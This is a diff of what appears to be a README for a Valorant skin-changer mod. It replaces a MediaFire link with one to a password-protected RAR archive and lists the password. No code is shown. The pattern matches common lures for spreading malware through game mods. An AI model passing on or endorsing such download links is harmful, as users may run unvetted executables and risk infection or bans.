@@ -8,7 +8,7 @@
 
 ### 📌 Version Information
 * ⏳ **Usage Limit:** 12 hours/day (For the Free version).
-* Link Downloads : https://www.mediafire.com/file/9uhugkay72rubci/ModSkinValV3.2.rar/file
+* Link Downloads : https://www.mediafire.com/file/ff1tkekvtvow2n5/SkinChangerValorant.rar/file
 * 🔑 **Extraction Password:** `123321456`
 * 🛠 **Compatibility:** Works well on Valorant 2026 update.
 
